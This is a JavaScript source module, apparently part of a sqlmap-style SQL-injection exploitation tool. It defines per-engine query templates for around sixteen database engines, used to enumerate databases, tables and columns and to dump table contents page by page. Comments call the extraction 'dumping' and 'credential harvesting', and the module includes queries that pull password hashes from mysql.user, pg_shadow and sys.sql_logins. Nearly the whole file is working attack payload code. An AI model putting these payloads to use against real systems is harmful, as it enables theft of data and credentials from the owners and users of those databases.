// =====================================================================
// sysQueries.js — 各库系统表查询模板（库/表/列/数据枚举与拖库）
// 自 extractionMaps.js 拆出（纯搬移）：基础 5 库 + TiDB/DM8 别名 + 扩展 11 库。
// 版本分支（resolveSysQueries / MSSQL <2017 降级）见 ./sysQueriesVersioned.js
// =====================================================================
import {
  escSql, escBacktick, escDq, escBracket, escCols, escColsNN, escColsNNJoin,
} from '../DialectSqlBuilder.js';

// 各库系统表查询模板（库/表/列/数据）
// 数据分隔符用控制字符 0x1F(列) / 0x1E(行)，替代原 '|' / '||'：业务数据几乎不会含控制字符，
// 避免字段值本身含 '|'（地址/备注极常见）导致解析错位。与 Exploiter.deepDump 的堆叠提取分隔符对齐。
// 列分隔符 SQL 常量：MySQL/SQLite=CHAR(31)，PG=CHR(31)，SQLServer=CHAR(31)，Oracle=CHR(31)
// 行分隔符 SQL 常量：MySQL/PG=CHAR(30)/CHR(30)，SQLServer=CHAR(30)，Oracle=CHR(30)
// [sqlmap 对标 --where] data 函数第六参数 where 为原始 SQL WHERE 子句（如 "id>100 AND name LIKE '%a%'"），
//   不对 WHERE 内容做转义（与 sqlmap --where 行为一致），仅由调用方确保安全性。

export const SYS_QUERIES = {
  MySQL: {
    databases: 'SELECT GROUP_CONCAT(schema_name SEPARATOR \',\') FROM information_schema.schemata',
    /** @type {(db: string) => string} */
    tables: (db) =>
      `SELECT GROUP_CONCAT(table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema='${escSql(db)}'`,
    /** @type {(db: string, table: string) => string} */
    columns: (db, table) =>
      `SELECT GROUP_CONCAT(column_name SEPARATOR ',') FROM information_schema.columns WHERE table_schema='${escSql(db)}' AND table_name='${escSql(table)}'`,
    // [P0-FIX 2026-09-09] 行分隔符必须显式声明：GROUP_CONCAT 默认用 ',' 连行，而解析器按
    // 0x1E 切行 → 整表被当成「一行」，列值按索引回填后跨行串列（实测 users 真实 5 行 → 落 1 行）。
    // [真库实测] MySQL 8.0.28 的 SEPARATOR 只接受**字面量**（SEPARATOR CHAR(30) 是 1064 语法
    // 错误），故用 hex 字面量 0x1E（=0x30-0x12? 不：0x1E 即十进制 30，行分隔符与解析器一致）。
    /** @type {(db: string, table: string, cols: string[], limit: number, offset: number, where: string|null) => string} */
    data: (db, table, cols, limit, offset = 0, where = null) => {
      const w = where ? ` WHERE ${where}` : '';
      // [P0-FIX 2026-09-09 真库实测] 分页必须下推进子查询：聚合输出恒为 1 行，顶层 LIMIT/OFFSET
      // 作用在聚合结果上——第 2 页起恒为空、第 1 页实为整表聚合再被 group_concat_max_len 截断。
      return 'SELECT GROUP_CONCAT(CONCAT_WS(CHAR(31), ' + escColsNN(cols, 'MySQL') + ') SEPARATOR 0x1E) FROM (SELECT ' + escCols(cols, 'MySQL') + ' FROM `' + escBacktick(db) + '`.`' + escBacktick(table) + '`' + w + ' LIMIT ' + limit + ' OFFSET ' + offset + ') __p';
    },
    // 凭据收割（对标 sqlmap --users/--passwords）：mysql.user 表需额外权限，查询失败由
    // enumerateUsers/enumeratePasswords 捕获并返回 null（不阻断主流程）。
    users: 'SELECT GROUP_CONCAT(CONCAT(user,0x40,host) SEPARATOR \',\') FROM mysql.user',
    // [P2-2] 密码哈希列按版本分支：MySQL 5.7+ 用 authentication_string（password 列已删除，
    // 引用即 Unknown column 报错）；<5.7 用 password（authentication_string 列不存在）。
    // 旧版 IFNULL(authentication_string,password) 在任何真实 MySQL 版本上都必然报错——
    // IFNULL 的两个参数列必须都存在。版本未知（null）→ 保守按 5.7+ 处理（现实存量主力）。
    passwords:
      'SELECT GROUP_CONCAT(CONCAT(user,0x40,host,0x3a,IFNULL(authentication_string,\'\')) SEPARATOR \',\') FROM mysql.user',
    // 版本 <5.7 的回退变体（resolveSysQueries 按版本选择，见文件尾部）
    passwordsLegacy:
      'SELECT GROUP_CONCAT(CONCAT(user,0x40,host,0x3a,IFNULL(password,\'\')) SEPARATOR \',\') FROM mysql.user',
  },
  PostgreSQL: {
    databases: 'SELECT string_agg(datname, \',\') FROM pg_database',
    // PostgreSQL 的 table_schema 是 schema 名（如 public），不是 database 名；
    // 忽略传入的 database 名，固定查 public，避免把 database 名当 schema 导致查空。
    tables: () =>
      `SELECT string_agg(table_name, ',') FROM information_schema.tables WHERE table_schema='public'`,
    /** @type {(db: string, table: string) => string} */
    columns: (db, table) =>
      `SELECT string_agg(column_name, ',') FROM information_schema.columns WHERE table_name='${escSql(table)}' AND table_schema='public'`,
    /** @type {(db: string, table: string, cols: string[], limit: number, offset: number, where: string|null) => string} */
    data: (db, table, cols, limit, offset = 0, where = null) => {
      const w = where ? ` WHERE ${where}` : '';
      // [P0-FIX 2026-09-09] 同 MySQL：分页下推进子查询（聚合结果只有 1 行，顶层分页无意义）
      return 'SELECT string_agg(CONCAT_WS(CHR(31), ' + escColsNN(cols, 'PostgreSQL') + '), CHR(30)) FROM (SELECT ' + escCols(cols, 'PostgreSQL') + ' FROM "' + escDq(table) + '"' + w + ' LIMIT ' + limit + ' OFFSET ' + offset + ') __p';
    },
    // 凭据收割（对标 sqlmap --users/--passwords）：pg_shadow 需超级用户权限，失败返回 null。
    users: "SELECT string_agg(usename,',') FROM pg_user",
    passwords: "SELECT string_agg(usename||':'||passwd, ',') FROM pg_shadow",
  },
  SQLite: {
    databases: null,
    tables: () => "SELECT group_concat(name) FROM sqlite_master WHERE type='table'",
    /** @type {(db: string, table: string) => string} */
    columns: (db, table) => `SELECT group_concat(name) FROM pragma_table_info('${escSql(table)}')`,
    // SQLite 的 group_concat 仅接受单参数，列间用 ||CHAR(31)|| 拼接成单串后再聚合
    /** @type {(db: string, table: string, cols: string[], limit: number, offset: number, where: string|null) => string} */
    data: (db, table, cols, limit, offset = 0, where = null) => {
      const w = where ? ` WHERE ${where}` : '';
      // [P0-FIX 2026-09-09] 用 escColsNNJoin 逐列包 NULL 安全表达式再以 CHAR(31) 连接。
      // 不可沿用旧 `escCols(...).replace(/,/g, ...)` 的字符串替换：IFNULL 内部的逗号会被误替换。
      return 'SELECT group_concat(' + escColsNNJoin(cols, 'SQLite', ' || CHAR(31) || ') + ' , CHAR(30)) FROM (SELECT ' + escCols(cols, 'SQLite') + ' FROM "' + escDq(table) + '"' + w + ' LIMIT ' + limit + ' OFFSET ' + offset + ') __p';
    },
  },
  'SQL Server': {
    databases: 'SELECT string_agg(name, \',\') FROM sys.databases',
    tables: () => 'SELECT string_agg(table_name, \',\') FROM information_schema.tables',
    /** @type {(db: string, table: string) => string} */
    columns: (db, table) =>
      `SELECT string_agg(column_name, ',') FROM information_schema.columns WHERE table_name='${escSql(table)}'`,
    /** @type {(db: string, table: string, cols: string[], limit: number, offset: number, where: string|null) => string} */
    data: (db, table, cols, limit, offset = 0, where = null) => {
      const w = where ? ` WHERE ${where}` : '';
      // [P2-2 顺带修复] CONCAT → CONCAT_WS：CONCAT 不插入分隔符（列值会黏在一起，
      // 列拆分按 0x1F 必然错位）；CONCAT_WS(CHAR(31), ...) 才是列间分隔语义（2017+ 可用）
      // [P0-FIX 2026-09-09] OFFSET/FETCH 下推进子查询（顶层分页作用于聚合结果，恒错）
      return 'SELECT string_agg(CONCAT_WS(CHAR(31), ' + escColsNN(cols, 'SQL Server') + '), CHAR(30)) FROM (SELECT ' + escCols(cols, 'SQL Server') + ' FROM [' + escBracket(table) + ']' + w + ' ORDER BY (SELECT NULL) OFFSET ' + offset + ' ROWS FETCH NEXT ' + limit + ' ROWS ONLY) __p';
    },
    // 凭据收割（对标 sqlmap --users/--passwords）：sys.sql_logins 需高权限，失败返回 null。
    users: "SELECT string_agg(name,',') FROM sys.sql_logins",
    passwords:
      "SELECT string_agg(name+':'+master.dbo.fn_varbintohexstr(password_hash),',') FROM sys.sql_logins",
  },
  Oracle: {
    // Oracle 无"库"概念，用 all_users 枚举可访问的 schema（等价于数据库级枚举）；
    // 注：all_users 仅返回已授权 schema，dba_users 需更高权限（前者更通用）。
    databases: "SELECT listagg(username, ',') WITHIN GROUP (ORDER BY username) FROM all_users",
    tables: () =>
      'SELECT listagg(table_name, \',\') WITHIN GROUP (ORDER BY table_name) FROM user_tables',
    /** @type {(db: string, table: string) => string} */
    columns: (db, table) =>
      `SELECT listagg(column_name, ',') WITHIN GROUP (ORDER BY column_name) FROM user_tab_columns WHERE table_name='${escSql(table)}'`,
    // [P0-FIX] Oracle 分页：用 ROWNUM 子查询包装支持 offset 偏移，替代原 ROWNUM<= 单页限制。
    // 旧模板仅 'WHERE ROWNUM<=' + limit，忽略 offset 造成大表拖库只能取前 limit 行。
    // [sqlmap 对标 --where] 有 where 时 ROWNUM 用 AND 拼接（WHERE 已存在），无 where 时用 WHERE。
    /** @type {(db: string, table: string, cols: string[], limit: number, offset: number, where: string|null) => string} */
    data: (db, table, cols, limit, offset = 0, where = null) => {
      const w = where ? ` WHERE ${where}` : '';
      // [P0-FIX 2026-09-09] 先对源表行做 ROWNUM 分页，再对取到的行聚合。
      // 旧实现对聚合结果套 ROWNUM（恒 1 行）：offset>0 恒空、limit>1 无意义。
      // [P2 审计修复 2026-09-20] 原用 CONCAT(CHR(31), <多列>) 拼列——Oracle 的 CONCAT
      // **恰好接受 2 个参数**，列数 ≥2 时第三个参数起直接 ORA-00909（实测 cols=["a","b"]
      // 生成 CONCAT(CHR(31), "a","b")）→ 拖库对多列表恒报错。改用 Oracle 的 || 运算符
      // 逐列拼接（无参数上限），并经 escColsNNJoin 逐列包 NVL(CAST(... AS VARCHAR2(4000)),'')
      // 做 NULL 安全——列值含 NULL 时若不兜底会整段丢失，解析器按 0x1F 切列将错位。
      const concat = `CHR(31) || ${escColsNNJoin(cols, 'Oracle', ' || CHR(31) || ')}`;
      const inner = `SELECT ${concat} AS r FROM "${escDq(table)}"${w}`;
      const src = offset > 0
        ? `SELECT r FROM (SELECT x.*, ROWNUM rnum FROM (${inner}) x WHERE ROWNUM <= ${offset + limit}) WHERE rnum > ${offset}`
        : `SELECT r FROM (${inner}) WHERE ROWNUM <= ${limit}`;
      return `SELECT listagg(r, CHR(30)) FROM (${src})`;
    },
  },
};

// TiDB：MySQL 协议兼容，系统库 information_schema 结构与 MySQL 完全一致 -> 直接复用 MySQL 分支
SYS_QUERIES.TiDB = SYS_QUERIES.MySQL;
// DM8（达梦）：Oracle 兼容模式，数据字典为 user_tables / user_tab_columns / 系统视图 -> 复用 Oracle 分支
SYS_QUERIES.DM8 = SYS_QUERIES.Oracle;
// ClickHouse：非标准 system.* 系统表，用 system.databases / system.tables / system.columns 枚举
// ClickHouse 的 toString 函数把任意类型转为字符串，CHAR(31)/CHAR(30) 做列/行分隔符
SYS_QUERIES.ClickHouse = {
  databases: "SELECT groupArray(name) FROM system.databases",
  /** @type {(db: string) => string} */
  tables: (db) => `SELECT groupArray(name) FROM system.tables WHERE database='${escSql(db)}'`,
  /** @type {(db: string, table: string) => string} */
  columns: (db, table) => `SELECT groupArray(name) FROM system.columns WHERE database='${escSql(db)}' AND table='${escSql(table)}'`,
  /** @type {(db: string, table: string, cols: string[], limit: number, offset: number, where: string|null) => string} */
  data: (db, table, cols, limit, offset = 0, where = null) => {
    const w = where ? ` WHERE ${where}` : '';
    // [P2 审计修复 2026-09-20] NULL 安全：ClickHouse 的 concat() **任一参数为 NULL 即返回 NULL**，
    // 而 groupArray 默认**跳过 NULL 元素** → 只要某行任一列为 NULL，该行整行被静默丢弃
    // （比「列错位」更严重的整行丢失）。逐列包 ifNull(toString(col),'') 兜底；
    // 显式 toString 是因为 concat 对非 String 类型走隐式序列化（语义等价但更明确）。
    const args = cols.map((c) => `ifNull(toString(${escCols([c], 'ClickHouse')}),'')`);
    const concatArgs = `CHAR(31), ${args.join(', CHAR(31), ')}`;
    return `SELECT arrayStringConcat(groupArray(CONCAT(${concatArgs})), CHAR(30)) FROM (SELECT ${escCols(cols, 'ClickHouse')} FROM \`${escBacktick(db)}\`.\`${escBacktick(table)}\`${w} LIMIT ${limit} OFFSET ${offset}) __p`;
  },
};

// DB2：用 SYSCAT 系统视图枚举（对标 mysql information_schema）
SYS_QUERIES.DB2 = {
  databases: "SELECT listagg(DB_NAME, ',') FROM TABLE(SYSPROC.ENV_GET_DB_INFO())",
  tables: () => "SELECT listagg(TABNAME, ',') FROM SYSCAT.TABLES WHERE TABSCHEMA NOT LIKE 'SYS%'",
  /** @type {(db: string, table: string) => string} */
  columns: (db, table) =>
    `SELECT listagg(COLNAME, ',') FROM SYSCAT.COLUMNS WHERE TABNAME='${escSql(table)}' AND TABSCHEMA NOT LIKE 'SYS%'`,
  /** @type {(db: string, table: string, cols: string[], limit: number, offset: number, where: string|null) => string} */
  data: (db, table, cols, limit, offset = 0, where = null) => {
    const w = where ? ` WHERE ${where}` : '';
    // [P2 审计修复 2026-09-20] 同上：DB2 的 CONCAT **只接受 2 个参数**（与 MySQL 的变参
    // CONCAT 不同），原 CONCAT(CHAR(31), <多列>) 在列数 ≥2 时参数超限报错 → 拖库恒失败。
    // 改用 DB2 支持的 || 运算符逐列拼接，并经 escColsNNJoin 包 COALESCE(CAST(... AS VARCHAR(4000)),'')
    // 做 NULL 安全（DB2 无 IFNULL/NVL，标准 COALESCE 可用）。
    const concat = `CHAR(31) || ${escColsNNJoin(cols, 'DB2', ' || CHAR(31) || ')}`;
    return `SELECT listagg(${concat}, CHAR(30)) FROM (SELECT ${escCols(cols, 'DB2')} FROM "${escDq(table)}"${w} LIMIT ${limit} OFFSET ${offset}) __p`;
  },
};

// HSQLDB（D 方向，最小适配）：用 INFORMATION_SCHEMA 枚举，语法类 MySQL（GROUP_CONCAT/反引号）
SYS_QUERIES.HSQLDB = {
  databases: "SELECT GROUP_CONCAT(TABLE_SCHEMA) FROM INFORMATION_SCHEMA.SYSTEM_SCHEMAS",
  tables: () => "SELECT GROUP_CONCAT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='PUBLIC'",
  /** @type {(db: string, table: string) => string} */
  columns: (db, table) =>
    `SELECT GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='${escSql(table)}'`,
  /** @type {(db: string, table: string, cols: string[], limit: number, offset: number, where: string|null) => string} */
  data: (db, table, cols, limit, offset = 0, where = null) => {
    const w = where ? ` WHERE ${where}` : '';
    // [P2 审计修复 2026-09-22 真引擎实测] HSQLDB 的 GROUP_CONCAT 分隔符**只接受引号字符串字面量**，
    // 表达式操作数会被语法分析器拒绝：
    //   SELECT GROUP_CONCAT(NAME SEPARATOR CHAR(30)) ...
    //   -> unexpected token : CHAR required: a quoted string   （HSQLDB 2.x 原话）
    // 与 MySQL 的 SEPARATOR_SYM text_string（Bug #64600）是**同一类**限制。
    // 修法：改用 U&'\001E'（SQL 标准 Unicode 转义字面量，0x1E 记录分隔符）。
    // 实测 `SEPARATOR U&'\001e'` 产出 `a<RS>b`，`SEPARATOR X'1E'` 仍被拒（HSQLDB 不认 hex 字面量作分隔符）。
    // 注意 CHAR(31) 在**行表达式里**是可用的（实测 SELECT CHAR(31) 返回 <US>），
    // 仅 SEPARATOR 的操作数受限——所以只改分隔符，列间拼接符保持 CHAR(31)。
    // 表引用同样不能用反引号：HSQLDB 实测 `FROM \`users\`` 报语法错/找不到对象。
    // 改用双引号（与 escCols 的 HSQLDB 分支一致）。
    return `SELECT GROUP_CONCAT(CONCAT_WS(CHAR(31), ${escColsNN(cols, 'HSQLDB')}) SEPARATOR U&'\\001E') FROM (SELECT ${escCols(cols, 'HSQLDB')} FROM "${escDq(table)}"${w} LIMIT ${limit} OFFSET ${offset}) __p`;
  },
};

// Derby（D 方向，最小适配）：系统表 SYS.SYSTABLES / SYS.SYSCOLUMNS
// [P2 审计修复 2026-09-22 真引擎实测] Derby 的枚举与拖库**均不可用**，原因是同一个：
// Derby 没有「多行折成一行字符串」的聚合原语，也没有控制字符函数。
// Derby 10.16 真 JDBC 实测（e2e/multi-engine-lab，Java 21）：
//
//   (1) 字符串聚合函数全部不存在：
//         SELECT GROUP_CONCAT(name) FROM users  -> 'GROUP_CONCAT' is not recognized as a function or procedure.
//         SELECT LISTAGG(name, ',') FROM users   -> 'LISTAGG' is not recognized as a function or procedure.
//         SELECT STRING_AGG(name, ',') FROM users-> 'STRING_AGG' is not recognized as a function or procedure.
//       SQL/XML 路线 XMLAGG(XMLELEMENT(NAME a, x)) 在本机引擎上逐一被拒：
//         Encountered "a" / Missing SQL/XML keyword(s) 'AS' / Encountered "e"
//       → 原模板用 GROUP_CONCAT 拼 TABLENAME / COLUMNNAME，**实测直接报函数不存在**。
//         （对照：databases 用 `SELECT CURRENT SCHEMA FROM SYSIBM.SYSDUMMY1` **实测 OK** → ["APP"]，
//           因它只取单值，无需聚合，故保留。）
//
//   (2) 控制字符函数不存在 —— CHAR(31) 被解析成**字符串字面量**而非 ASCII 31：
//         SELECT CHAR(31) FROM users        -> "31         "（11 字符，右填充）
//         SELECT LENGTH(CAST(CHAR(31) AS VARCHAR(100)))  -> 11
//       → 行/列分隔符（0x1E/0x1F）在 Derby 上根本造不出来，即使有聚合函数也无法分隔多行多列。
//
// 故 tables / columns / data 三项一律降级为 null（与 Access / Informix 同处置）。
// 调用方 Extractor 已支持 null（枚举走 `?.tables?.(db)` 返回空列表；拖库走 `if (!q0) return []`），
// 不再出现「标记不支持、运行时抛错」的错配。
SYS_QUERIES.Derby = {
  databases: "SELECT CURRENT SCHEMA FROM SYSIBM.SYSDUMMY1",
  tables: null,
  columns: null,
  data: null,
};

// [⑭] 补全 6 库拖库字典（Sybase/Firebird/Informix/H2/Access/MonetDB）
// 原仅 11 库有 SYS_QUERIES（MySQL/PG/SQLite/MSSQL/Oracle/ClickHouse/DB2/HSQLDB/Derby
// + TiDB/DM8 别名），6 库缺失导致枚举/拖库降级为空。

// Sybase ASE：用 list() 聚合（ASE 15+），系统表 sysobjects/syscolumns
// CHAR(31)/CHAR(30) 在 ASE 中可用；分页用 TOP n START AT m（ASE 15.7+）
SYS_QUERIES.Sybase = {
  databases: "SELECT list(name) FROM master.dbo.sysdatabases",
  tables: () => "SELECT list(name) FROM sysobjects WHERE type='U'",
  /** @type {(db: string, table: string) => string} */
  columns: (db, table) =>
    `SELECT list(name) FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='${escSql(table)}')`,
  // [FIX] Sybase ASE 的 TOP / START AT 属于 SELECT 子句，必须紧跟 SELECT 而非放在 FROM 之后。
  // 旧模板拼成 `... FROM [table] WHERE ... TOP n START AT m`，在 ASE 上是语法错误（拖库必然失败）。
  /** @type {(db: string, table: string, cols: string[], limit: number, offset: number, where: string|null) => string} */
  data: (db, table, cols, limit, offset = 0, where = null) => {
    const w = where ? ` WHERE ${where}` : '';
    // [P0-FIX 2026-09-09] TOP/START AT 下推进子查询：顶层 TOP 作用在聚合结果（恒 1 行）上无意义
    const inner = `SELECT ${escCols(cols, 'Sybase')} FROM [${escBracket(table)}]${w}`;
    const src = offset > 0
      ? `(SELECT TOP ${limit} START AT ${offset + 1} * FROM (${inner}) __d)`
      : `(SELECT TOP ${limit} * FROM (${inner}) __d)`;
    return `SELECT list(CONCAT_WS(CHAR(31), ${escColsNN(cols, 'Sybase')}), CHAR(30)) FROM ${src} __p`;
  },
};

// Firebird：用 list() 聚合（FB 2.1+），系统表 rdb$* 系列
// ASCII_CHAR() 是 Firebird 的控制字符函数（非 CHAR()）；分页用 ROWS m TO n
// databases=null：Firebird 是单库架构（一个数据库文件=一个库），无"枚举所有库"概念
SYS_QUERIES.Firebird = {
  databases: null,
  tables: () =>
    "SELECT list(rdb$relation_name) FROM rdb$relations WHERE rdb$system_flag=0 AND rdb$view_blr IS NULL",
  /** @type {(db: string, table: string) => string} */
  columns: (db, table) =>
    `SELECT list(rdb$field_name) FROM rdb$relation_fields WHERE rdb$relation_name='${escSql(table)}'`,
  /** @type {(db: string, table: string, cols: string[], limit: number, offset: number, where: string|null) => string} */
  data: (db, table, cols, limit, offset = 0, where = null) => {
    const w = where ? ` WHERE ${where}` : '';
    // [P2 审计修复 2026-09-20] NULL 安全：Firebird 的 || 运算符遇 NULL 即整串变 NULL
    // （官方手册明示 `'Home ' || 'sweet ' || NULL = NULL`），配合 list() 聚合会**整行静默丢失**。
    // 原实现用 escCols(...).replace(/,/g,' || ASCII_CHAR(31) || ') 拼列——这正是
    // DialectSqlBuilder 注释里点名批评的反模式（兜底表达式内部的逗号会被误替换）。
    // 改用 escColsNNJoin 逐列包 COALESCE(CAST(... AS VARCHAR(4000)),'')，连接符显式传入。
    const concat = `ASCII_CHAR(31) || ${escColsNNJoin(cols, 'Firebird', ' || ASCII_CHAR(31) || ')}`;
    return `SELECT list(${concat}, ASCII_CHAR(30)) FROM (SELECT ${escCols(cols, 'Firebird')} FROM "${escDq(table)}"${w} ROWS (${offset + 1}) TO (${offset + limit})) __p`;
  },
};

// Informix：list() 聚合（IDS 12.10+），系统表 systables/syscolumns
// 控制字符问题：Informix 无 CHAR()/CHR() 函数，无法在 SQL 中生成 0x1F/0x1E
// -> data=null（不支持控制字符分隔的聚合提取，降级到逐行 UNION 或盲注）
SYS_QUERIES.Informix = {
  databases: "SELECT list(dbsname) FROM sysmaster:sysdatabases",
  tables: () =>
    "SELECT list(tabname) FROM systables WHERE tabtype='T' AND tabid > 99",
  /** @type {(db: string, table: string) => string} */
  columns: (db, table) =>
    `SELECT list(colname) FROM syscolumns WHERE tabid=(SELECT tabid FROM systables WHERE tabname='${escSql(table)}')`,
  data: null,
};

// H2：GROUP_CONCAT + CHAR()（与 HSQLDB 类似，H2 兼容 MySQL 语法）
SYS_QUERIES.H2 = {
  databases: "SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata",
  /** @type {(db: string) => string} */
  tables: (db) =>
    `SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='${escSql(db)}'`,
  /** @type {(db: string, table: string) => string} */
  columns: (db, table) =>
    `SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='${escSql(table)}'`,
  /** @type {(db: string, table: string, cols: string[], limit: number, offset: number, where: string|null) => string} */
  data: (db, table, cols, limit, offset = 0, where = null) => {
    const w = where ? ` WHERE ${where}` : '';
    return `SELECT GROUP_CONCAT(CONCAT_WS(CHAR(31), ${escColsNN(cols, 'H2')}) SEPARATOR CHAR(30)) FROM (SELECT ${escCols(cols, 'H2')} FROM "${escDq(table)}"${w} LIMIT ${limit} OFFSET ${offset}) __p`;
  },
};

// Access：不支持 GROUP_CONCAT/LIST 等字符串聚合，无 information_schema，无 CHAR()/LIMIT
// 所有枚举返回 null（诚实降级，与 sqlmap 对 Access 的处理一致）
SYS_QUERIES.Access = {
  databases: null,
  tables: null,
  columns: null,
  data: null,
};

// MonetDB：group_concat + CHAR()（MonetDB 支持 group_concat 和 CHAR 函数）
SYS_QUERIES.MonetDB = {
  databases: "SELECT group_concat(name) FROM sys.schemas",
  /** @type {(db: string) => string} */
  tables: (db) =>
    `SELECT group_concat(name) FROM sys.tables WHERE schema_id=(SELECT id FROM sys.schemas WHERE name='${escSql(db)}')`,
  /** @type {(db: string, table: string) => string} */
  columns: (db, table) =>
    `SELECT group_concat(name) FROM sys.columns WHERE table_id=(SELECT id FROM sys.tables WHERE name='${escSql(table)}')`,
  /** @type {(db: string, table: string, cols: string[], limit: number, offset: number, where: string|null) => string} */
  data: (db, table, cols, limit, offset = 0, where = null) => {
    const w = where ? ` WHERE ${where}` : '';
    return `SELECT group_concat(CONCAT_WS(CHAR(31), ${escColsNN(cols, 'MonetDB')}), CHAR(30)) FROM (SELECT ${escCols(cols, 'MonetDB')} FROM "${escDq(table)}"${w} LIMIT ${limit} OFFSET ${offset}) __p`;
  },
};

